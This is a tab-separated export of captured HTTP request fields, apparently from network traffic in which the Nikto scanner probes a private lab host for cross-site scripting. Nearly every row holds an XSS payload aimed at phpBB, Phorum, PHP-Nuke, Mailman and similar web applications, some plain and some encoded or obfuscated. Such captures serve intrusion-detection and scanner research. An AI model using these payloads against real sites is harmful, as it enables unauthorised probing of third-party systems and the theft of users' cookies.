http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									784						1	http://192.168.1.101/web/phpBB/viewtopic.php?topic_id=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000820)				/web/phpBB/viewtopic.php?topic_id=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									785						1	http://192.168.1.101/web/phpBB/viewtopic.php?t=17071&highlight=\">\"<script>javascript:alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000821)				/web/phpBB/viewtopic.php?t=17071&highlight=\">\"<script>javascript:alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									786						1	http://192.168.1.101/web/phorum/admin/header.php?GLOBALS[message]=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000822)				/web/phorum/admin/header.php?GLOBALS[message]=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									787						1	http://192.168.1.101/web/phorum/admin/footer.php?GLOBALS[message]=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000823)				/web/phorum/admin/footer.php?GLOBALS[message]=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									788						1	http://192.168.1.101/web/pages/htmlos/%3Cscript%3Ealert('Vulnerable');%3C/script%3E		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000825)				/web/pages/htmlos/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
																	Keep-Alive										192.168.1.101									789						1	http://192.168.1.101/web/Page/1,10966,,00.html?var=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000826)				/web/Page/1,10966,,00.html?var=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									790						1	http://192.168.1.101/web/openautoclassifieds/friendmail.php?listing=<script>alert(document.domain);</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000827)				/web/openautoclassifieds/friendmail.php?listing=<script>alert(document.domain);</script>
																	Keep-Alive										192.168.1.101									791						1	http://192.168.1.101/web/openautoclassifieds/friendmail.php?listing=&lt;script&gt;alert(document.domain);&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000828)				/web/openautoclassifieds/friendmail.php?listing=&lt;script&gt;alert(document.domain);&lt;/script&gt;
																	Keep-Alive										192.168.1.101									792						1	http://192.168.1.101/web/node/view/666\"><script>alert(document.domain)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000829)				/web/node/view/666\"><script>alert(document.domain)</script>
																	Keep-Alive										192.168.1.101									793						1	http://192.168.1.101/web/netutils/whodata.stm?sitename=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000830)				/web/netutils/whodata.stm?sitename=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									794						1	http://192.168.1.101/web/nav/cList.php?root=</script><script>alert('Vulnerable')/<script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000831)				/web/nav/cList.php?root=</script><script>alert('Vulnerable')/<script>
																	Keep-Alive										192.168.1.101									795						1	http://192.168.1.101/web/myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query=		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000832)				/web/myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query=
																	Keep-Alive										192.168.1.101									796						1	http://192.168.1.101/web/myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query=		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000833)				/web/myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query=
																	Keep-Alive										192.168.1.101									797						1	http://192.168.1.101/web/myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000834)				/web/myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent
																	Keep-Alive										192.168.1.101									798						1	http://192.168.1.101/web/myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000835)				/web/myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent
																	Keep-Alive										192.168.1.101									799						1	http://192.168.1.101/web/myhome.php?action=messages&box=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000836)				/web/myhome.php?action=messages&box=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									800						1	http://192.168.1.101/web/msadm/user/login.php3?account_name=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000837)				/web/msadm/user/login.php3?account_name=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									801						1	http://192.168.1.101/web/msadm/site/index.php3?authid=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000838)				/web/msadm/site/index.php3?authid=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									802						1	http://192.168.1.101/web/msadm/domain/index.php3?account_name=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000839)				/web/msadm/domain/index.php3?account_name=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									803						1	http://192.168.1.101/web/modules/Submit/index.php?op=pre&title=<script>alert(document.cookie);</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000840)				/web/modules/Submit/index.php?op=pre&title=<script>alert(document.cookie);</script>
																	Keep-Alive										192.168.1.101									804						1	http://192.168.1.101/web/modules/Forums/bb_smilies.php?site_font=}--></style><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000841)				/web/modules/Forums/bb_smilies.php?site_font=}--></style><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									805						1	http://192.168.1.101/web/modules/Forums/bb_smilies.php?name=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000842)				/web/modules/Forums/bb_smilies.php?name=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									806						1	http://192.168.1.101/web/modules/Forums/bb_smilies.php?Default_Theme=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000843)				/web/modules/Forums/bb_smilies.php?Default_Theme=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									807						1	http://192.168.1.101/web/modules/Forums/bb_smilies.php?bgcolor1=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000844)				/web/modules/Forums/bb_smilies.php?bgcolor1=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									808						1	http://192.168.1.101/web/modules.php?op=modload&name=Xforum&file=member&action=viewpro&member=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000845)				/web/modules.php?op=modload&name=Xforum&file=member&action=viewpro&member=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									809						1	http://192.168.1.101/web/modules.php?op=modload&name=Xforum&file=<script>alert('Vulnerable')</script>&fid=2		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000846)				/web/modules.php?op=modload&name=Xforum&file=<script>alert('Vulnerable')</script>&fid=2
																	Keep-Alive										192.168.1.101									810						1	http://192.168.1.101/web/modules.php?op=modload&name=Wiki&file=index&pagename=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000847)				/web/modules.php?op=modload&name=Wiki&file=index&pagename=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									811						1	http://192.168.1.101/web/modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink&cid=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000848)				/web/modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink&cid=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									812						1	http://192.168.1.101/web/modules.php?op=modload&name=WebChat&file=index&roomid=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000849)				/web/modules.php?op=modload&name=WebChat&file=index&roomid=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									813						1	http://192.168.1.101/web/modules.php?op=modload&name=Members_List&file=index&letter=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000850)				/web/modules.php?op=modload&name=Members_List&file=index&letter=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									814						1	http://192.168.1.101/web/modules.php?op=modload&name=Guestbook&file=index&entry=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000851)				/web/modules.php?op=modload&name=Guestbook&file=index&entry=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									815						1	http://192.168.1.101/web/modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000852)				/web/modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0
																	Keep-Alive										192.168.1.101									816						1	http://192.168.1.101/web/modules.php?op=modload&name=DMOZGateway&file=index&topic=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000853)				/web/modules.php?op=modload&name=DMOZGateway&file=index&topic=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									817						1	http://192.168.1.101/web/modules.php?op=modload&name=books&file=index&req=search&query=|script|alert(document.cookie)|/script|		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000854)				/web/modules.php?op=modload&name=books&file=index&req=search&query=|script|alert(document.cookie)|/script|
																	Keep-Alive										192.168.1.101									818						1	http://192.168.1.101/web/modules.php?name=Your_Account&op=userinfo&username=bla<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000855)				/web/modules.php?name=Your_Account&op=userinfo&username=bla<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									819						1	http://192.168.1.101/web/modules.php?name=Your_Account&op=userinfo&uname=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000856)				/web/modules.php?name=Your_Account&op=userinfo&uname=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									820						1	http://192.168.1.101/web/modules.php?name=Surveys&pollID=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000857)				/web/modules.php?name=Surveys&pollID=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									821						1	http://192.168.1.101/web/modules.php?name=Stories_Archive&sa=show_month&year=<script>alert('Vulnerable')</script>&month=3&month_l=test		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000858)				/web/modules.php?name=Stories_Archive&sa=show_month&year=<script>alert('Vulnerable')</script>&month=3&month_l=test
																	Keep-Alive										192.168.1.101									822						1	http://192.168.1.101/web/modules.php?name=Stories_Archive&sa=show_month&year=2002&month=03&month_l=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000859)				/web/modules.php?name=Stories_Archive&sa=show_month&year=2002&month=03&month_l=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									823						1	http://192.168.1.101/web/modules.php?name=Downloads&d_op=viewdownloaddetails&lid=02&ttitle=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000860)				/web/modules.php?name=Downloads&d_op=viewdownloaddetails&lid=02&ttitle=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									824						1	http://192.168.1.101/web/modules.php?name=Classifieds&op=ViewAds&id_subcatg=75&id_catg=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000861)				/web/modules.php?name=Classifieds&op=ViewAds&id_subcatg=75&id_catg=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									825						1	http://192.168.1.101/web/modules.php?letter=%22%3E%3Cimg%20src=javascript:alert(document.cookie);%3E&op=modload&name=Members_List&file=index		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000862)				/web/modules.php?letter=%22%3E%3Cimg%20src=javascript:alert(document.cookie);%3E&op=modload&name=Members_List&file=index
																	Keep-Alive										192.168.1.101									826						1	http://192.168.1.101/web/members.asp?SF=%22;}alert(223344);function%20x(){v%20=%22		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000863)				/web/members.asp?SF=%22;}alert(223344);function%20x(){v%20=%22
																	Keep-Alive										192.168.1.101									827						1	http://192.168.1.101/web/megabook/admin.cgi?login=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000864)				/web/megabook/admin.cgi?login=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									828						1	http://192.168.1.101/web/mailman/options/yourlist?language=en&email=&lt;SCRIPT&gt;alert('Vulnerable')&lt;/SCRIPT&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000865)				/web/mailman/options/yourlist?language=en&email=&lt;SCRIPT&gt;alert('Vulnerable')&lt;/SCRIPT&gt;
																	Keep-Alive										192.168.1.101									829						1	http://192.168.1.101/web/mailman/listinfo/<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000866)				/web/mailman/listinfo/<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									830						1	http://192.168.1.101/web/ldap/cgi-bin/ldacgi.exe?Action=<script>alert(\"Vulnerable\")</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000867)				/web/ldap/cgi-bin/ldacgi.exe?Action=<script>alert(\"Vulnerable\")</script>
